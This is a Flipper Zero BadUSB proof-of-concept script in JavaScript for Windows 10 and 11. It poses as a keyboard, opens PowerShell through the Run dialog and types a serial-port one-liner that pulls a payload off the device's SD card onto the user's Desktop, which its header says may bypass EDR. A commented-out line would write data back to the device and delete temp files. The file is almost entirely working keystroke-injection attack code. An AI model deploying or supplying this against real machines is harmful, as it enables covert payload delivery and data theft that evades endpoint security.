// Title: Read Data from Flipper via Serial (adapted to JS)
// Author: emptythevoid
// Target: Windows 10, Windows 11
// Version: 1.0
// Category: PoC
// Desc: This script will read in a small payload from the Flipper's SD card
// over serial, possibly bypassing EDR. In this proof-of-concept, the "payload"
// is saved to the current user's Desktop

let badusb = require("badusb");
let notify = require("notification");
let flipper = require("flipper");
let dialog = require("dialog");

badusb.setup({ vid: 0x1234, pid: 0x1234, mfr_name: "Flipper", prod_name: "Zero" });
dialog.message("Read from Flipper Serial", "Press OK to start");

if (badusb.isConnected()) {
    notify.blink("green", "short");

    badusb.press("GUI", "r");
    delay(500);
    
    badusb.println("powershell");
    delay(750);

    
    badusb.println('$SUSB="USB\\\VID_0483&PID_5740";'); // the device ID of the Flipper.  
    
    // Commands to build the serial port
    badusb.println('1..600|%{Try{$port = New-Object System.IO.Ports.SerialPort;$COM=("COM$(Get-PNPDevice -PresentOnly | Where{$_.InstanceID -match $SUSB -and $_.Class -eq "Ports"} | % name | select-string \d+ | % { $_.matches.value })");$port.PortName = $COM;$port.BaudRate = "230400";$port.Parity = "None";$port.DataBits = 8;$port.StopBits = 1;$port.ReadTimeout = 9000;$port.DTREnable = $True;$port.open();$SPATH="/ext/apps_data/testfile.txt";$OPATH="C:\\users\\$env:username\\Desktop\\outfile.txt";Start-Sleep -m 500;$port.DiscardInBuffer();$port.Write("storage read $SPATH `r`n");Start-Sleep -m 500;$outfile = $port.ReadExisting();$outfileformat = $outfile.split([string[]]"`r`n", [StringSplitOptions]::None);$outfileformat[2..($outfileformat.length -3)] | Out-File $OPATH;$port.close();echo "done";exit;}Catch{Sleep 1}};');
    
    // Command to have powershell wait for Flipper to exit badUSB mode, identify which COM port it's connected to, and open a serial connection and write contents of $d.
    // It will remove the temp information created earlier
    //badusb.println('1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(Get-PNPDevice -PresentOnly | Where{$_.InstanceID -match $SUSB -and $_.Class -eq "Ports"} | % name | select-string \d+ | % { $_.matches.value })",230400,"None",8,"one");$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();cd..;Remove-Item $env:temp/js2k3kd4nne5dhsk -Recurse;exit}Catch{Sleep 1}}');

    badusb.quit();  //automatically quit badusb and await serial connection

    

    notify.success();
} else {
    print("USB not connected");
    notify.error();
}
